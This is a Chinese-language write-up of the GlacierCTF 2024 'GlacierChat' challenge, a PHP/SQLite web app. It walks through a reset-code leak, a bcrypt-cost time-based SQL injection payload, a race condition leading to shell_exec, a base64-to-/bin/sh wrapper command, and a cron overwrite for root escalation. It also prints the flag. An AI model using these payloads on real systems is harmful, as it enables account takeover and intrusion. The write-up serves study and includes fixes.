# GlacierCTF 2024 GlacierChat

## 题目简述

GlacierChat 是带多租户用户表、密码重置、TOTP 二次认证和帖子审批的 PHP/SQLite 应用。解题需要串联四个独立问题：带租户前缀的重置码被响应直接泄露；设置新密码时存在 SQLite 注入；bcrypt cost 可作为时间盲注通道泄露管理员 TOTP；帖子创建的 `MAX(id)` 竞态可把审批对象错绑到普通文本帖，最终让审批预览把文本当 shell 命令执行。flag 只允许 root 读取，还要覆盖由 root 周期执行的 `cron.php` 完成提权。

## 解题过程

### 1. 让重置接口回显 admin 的 code

`reset.php` 支持一个 `is_tenant=1` 参数。此时传给 `getResetCode()` 的租户 ID 非空，而工具函数会把带自定义前缀的完整 code 写进警告：

```php
function getResetCode($prefix = "") {
    $reset_code = $prefix . random_str(16);
    if ($prefix !== "")
        echo "Warning: Reset code " . $reset_code .
             " uses custom prefix...";
    return $reset_code;
}
```

发送：

```text
form_name=reset&username=admin&is_tenant=1
```

从响应中的 `Reset code ... uses` 提取完整 code。它确实被写进 admin 对应行，不需要接收邮件。

### 2. 用 bcrypt cost 构造时间盲注

`set_new_password.php` 的第一条 code 查询使用参数绑定，但随后把 `username` 直接拼进 SQL：

```php
$stmt = $db->prepare(
    "SELECT password_cost FROM $users_table " .
    "WHERE reset_code = :code AND username = '$username'"
);
```

查询结果被限制到 5–12 后作为 bcrypt cost。cost 每增加 1，计算量大约翻倍，因此可以用条件表达式返回 12 或 5，把布尔结果转成稳定的响应时间差：

```sql
' OR 1 UNION
SELECT MAX(
  CASE WHEN totp_secret LIKE 'ABC%'
       AND substr(totp_secret,1,3)='ABC'
       THEN 12 ELSE 5 END
)
FROM tenant_xxxxxxxx_users
WHERE username='admin'; --
```

先在 `sqlite_schema` 中逐字符枚举以 `tenant_` 开头的动态用户表名，再枚举 admin 的 8 字节 Base32 `totp_secret`。官方脚本以约 0.15 秒为阈值，实际部署时应先分别测一组必真/必假条件再选择阈值。

得到 secret 后，正常触发一次新的 admin 密码重置，将密码改成已知值，再按 RFC TOTP 生成当前六位验证码登录。注入阶段只用于泄露，最终认证流程仍使用正常用户名 `admin`。

### 3. 竞态让审批记录指向文本帖

媒体帖创建流程跨多个数据库连接：

```text
insertMediaContent(uri)
last_id = SELECT MAX(id) FROM content
requirePostApproval(last_id, message)
```

插入和取 `MAX(id)` 之间没有事务。并发插入一个普通文本帖，可形成：

```text
请求 A：插入 media，得到内容 id N
请求 B：插入 text，得到内容 id N+1
请求 A：SELECT MAX(id)，错误地取得 N+1
请求 A：为 N+1 创建 approval_request
```

这使已经标记为 approved 的文本帖也拥有审批记录。更严重的是，预览/批准共用的 `fetchMediaContent()` 不检查内容类型，而是直接执行数据库里的 `content`：

```php
$media_content = $row["content"];
$fetched_content = shell_exec("$media_content 2>&1");
return base64_encode($fetched_content);
```

于是错绑的文本内容成为 shell 命令。文本插入前经过 `htmlspecialchars()`，复杂命令中的引号和重定向会被改写；官方 exploit 将原命令 Base64 编码，再只提交安全字符组成的包装命令：

```sh
echo <base64> | base64 -d | /bin/sh
```

批准对应请求后，命令输出被放进 `data:image;base64,...`，从页面解码即可回收 stdout。为提高竞态命中率，可先创建一个普通媒体帖观察审批 ID，再并发发送多条文本帖和媒体帖，尝试紧邻的审批 ID。

### 4. 覆盖 root cron 脚本读取 flag

Web RCE 身份仍是 `www-data`，而 `/flag.txt` 只允许 root 读取。容器入口以 root 启动 `/service/cron.sh`，它每 20 秒执行：

```sh
/usr/local/bin/php /var/www/cron.php
```

`/var/www/cron.php` 又可被 Web 用户覆盖。先通过命令执行写入：

```php
<?php exec('chmod 644 /flag.txt'); ?>
```

等待下一次 root cron 运行，再执行 `cat /flag.txt`，得到：

```text
gctf{Us3_PhP_Th3y_Sa!D_Y0U_W!lL_L0v3_iT_Th3Y_S2ID!!!!!}
```

作者的补充复盘见 [GlacierChat 官方题解](https://saiger.dev/blog/ctf-glacierchat/)。外链中的重置码、时间盲注、竞态、命令回显与 cron 提权机制均已归纳到正文。

## 方法总结

利用链是“重置码信息泄露 → bcrypt cost 时间盲注 → TOTP 泄露并接管 admin → 跨连接 `MAX(id)` 竞态 → 文本帖被当命令执行 → 覆盖 root cron 改 flag 权限”。每一步都依赖前一步建立的新能力。修复应停止回显敏感 token、所有 SQL 值均参数化、用单事务和连接内 `last_insert_rowid()` 绑定刚插入的对象、在审批路径严格校验内容类型并禁止 `shell_exec`，以及让高权限定时任务只执行 root 拥有且 Web 用户不可写的文件。
